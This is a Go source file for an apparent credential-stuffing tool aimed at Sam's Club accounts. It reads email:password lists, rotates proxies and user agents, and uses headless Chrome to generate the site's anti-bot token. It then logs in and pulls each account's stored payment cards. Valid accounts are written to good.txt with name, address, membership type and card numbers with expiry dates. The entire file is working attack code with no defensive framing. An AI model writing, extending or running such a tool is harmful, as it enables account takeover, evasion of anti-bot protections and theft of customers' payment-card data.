package samsclub

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/mvrlin/samsclub/pkg/logger"
)

// Account represents an account.
type Account struct {
	Client *http.Client

	Cookies   []*http.Cookie
	Proxy     *url.URL
	Token     string
	UserAgent string

	Email    string
	Password string
	Valid    bool

	Data struct {
		Cards
		Member
	}
}

// Authenticate is trying to login the account.
func (a *Account) Authenticate() error {
	requestBody, err := json.Marshal(map[string]interface{}{
		"deviceId":       "",
		"password":       a.Password,
		"prftcf":         a.Token,
		"response_group": "member",
		"stayLog":        false,
		"username":       a.Email,
	})

	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", "https://www.samsclub.com/api/node/vivaldi/v1/auth/login", bytes.NewReader(requestBody))
	if err != nil {
		return err
	}

	req.Header.Set("apiKey", "Desktop")
	req.Header.Set("User-Agent", a.UserAgent)

	resp, err := a.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var ra ResponseAuthenticate
	err = json.NewDecoder(resp.Body).Decode(&ra)
	if err != nil {
		return err
	}

	if ra.Status == "SUCCESS" {
		a.Data.Member = ra.Member

		a.Cookies = resp.Cookies()
		a.Valid = true
	}

	return nil
}

// ConnectToProxy is assigning a random proxy.
func (a *Account) ConnectToProxy(proxies []*url.URL) error {
	if len(proxies) == 0 {
		return errors.New("No proxies found")
	}

	// Update proxy.
	a.Proxy = proxies[rand.Intn(len(proxies))]

	// Update client proxy.
	a.Client.Transport = &http.Transport{
		Proxy: http.ProxyURL(a.Proxy),
	}

	return nil
}

// GenerateToken is generating prftcf for IP & User-Agent.
func (a *Account) GenerateToken(execPath string) error {
	opts := []chromedp.ExecAllocatorOption{
		chromedp.ExecPath(execPath),
		chromedp.ProxyServer(a.Proxy.String()),
		chromedp.UserAgent(a.UserAgent),

		chromedp.DisableGPU,
		chromedp.Headless,
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
	}

	ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	var token string
	err := chromedp.Run(ctx,
		chromedp.Navigate("https://www.samsclub.com/sams/account/signin/login.jsp"),
		chromedp.WaitReady("#cfHiddenField", chromedp.ByQuery),
		chromedp.Evaluate(`
			cf.cfsubmit()
			document.querySelector("#cfHiddenField").value
		`, &token),
	)

	if err != nil {
		return err
	}

	a.Token = token

	return nil
}

// GenerateUserAgent is generating a random mobile User-Agent.
func (a *Account) GenerateUserAgent() {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
	}

	a.UserAgent = agents[rand.Intn(len(agents))]
}

// ListCards is returning a list of account cards.
func (a *Account) ListCards() error {
	req, err := http.NewRequest("GET", "https://www.samsclub.com/api/node/vivaldi/v1/account/wallet/cards?response_group=full", nil)
	if err != nil {
		return err
	}

	for _, cookie := range a.Cookies {
		req.AddCookie(cookie)
	}

	resp, err := a.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var rlc ResponseListCards
	err = json.NewDecoder(resp.Body).Decode(&rlc)
	if err != nil {
		return err
	}

	a.Data.Cards = rlc.Cards

	return nil
}

// handleAccount determines whether account is good or bad.
func (sc *SamsClub) handleAccount(a *Account) {
	var err error

	for {
		time.Sleep(3 * time.Second)

		if len(sc.ProxyList) == 0 {
			continue
		}

		log.Printf("%s:%s\n", a.Email, a.Password)
		a.GenerateUserAgent()

		if err = a.ConnectToProxy(sc.ProxyList); err != nil {
			continue
		}

		if err = a.GenerateToken(sc.ExecPath); err != nil {
			continue
		}

		if err = a.Authenticate(); err != nil {
			continue
		}

		if a.Valid {
			if err = a.ListCards(); err != nil {
				continue
			}
		}

		sc.Accounts <- a
		break
	}
}

// GetAccounts is reading accounts from file & handling it.
func (sc *SamsClub) GetAccounts() error {
	workersLimit := sc.Config.Workers | 5

	file, err := os.Open(os.Args[1])
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	total := 0

	go func() {
		for account := range sc.Accounts {
			if account.Valid {
				c := account.Data.Cards
				m := account.Data.Member

				cardsBody := "No Cards"
				memberBody := fmt.Sprintf(
					"%s:%s\n\n%s %s\n%s, %s, %s, %s\n\nMembership: %s\n",
					account.Email, account.Password,
					m.FirstName, m.LastName,
					m.Address, m.City, m.State, m.Zip,
					m.MembershipType,
				)

				if len(c) > 0 {
					cardsBody = ""

					for _, card := range c {
						label := "VALID"

						if card.Expired {
							label = "EXPIRED"
						}

						cardsBody += fmt.Sprintf(
							"%s %s | %s/%s (%s)\n",
							card.Type, card.Number, card.ExpMonth, card.ExpYear, label,
						)
					}
				}

				body := fmt.Sprintf(
					"%s\n%s\n---",
					memberBody,
					cardsBody,
				)

				logger.Write("good.txt", body)
			} else {
				logger.Write(
					"bad.txt",
					fmt.Sprintf("%s:%s", account.Email, account.Password),
				)
			}
		}

		close(sc.Accounts)
	}()

	for worker := 0; worker < workersLimit; worker++ {
		wg.Add(1)

		go func() {
			defer wg.Done()

			for account := range sc.AccountsQueue {
				sc.handleAccount(account)
			}
		}()
	}

	for scanner.Scan() {
		total++

		text := strings.Split(scanner.Text(), ":")
		email, password := text[0], text[1]

		account := &Account{
			Client: &http.Client{
				Timeout: 30 * time.Second,
			},

			Email:    email,
			Password: password,
		}

		sc.AccountsQueue <- account
	}

	close(sc.AccountsQueue)
	wg.Wait()

	return nil
}
